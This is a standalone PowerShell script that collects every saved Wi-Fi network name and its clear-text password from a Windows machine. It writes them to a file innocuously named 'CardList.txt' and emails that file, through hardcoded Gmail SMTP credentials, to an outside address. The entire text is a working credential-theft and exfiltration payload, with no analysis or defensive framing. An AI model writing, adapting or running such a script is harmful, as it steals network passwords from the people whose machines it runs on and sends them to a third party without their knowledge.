$WirelessSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
$WifiInfo = foreach($SSID in $WirelessSSIDs) {
    $Password = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Key Content') -replace ".*:\s+"
    New-Object -TypeName psobject -Property @{"SSID"=$SSID;"Password"=$Password}
}  

cd $HOME\AppData\Roaming

$WifiInfo | Out-File CardList.txt -Encoding utf8

$secpasswd = ConvertTo-SecureString "cloudaremist" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("noreply.id19627@gmail.com", $secpasswd)

Send-MailMessage -From "noreply.id19627@gmail.com" -to "0daysolutions@gmail.com" -Subject "Hail Before Me" -Body "Done !" -SmtpServer "smtp.gmail.com" -port 587 -UseSsl -Credential $cred -Attachments CardList.txt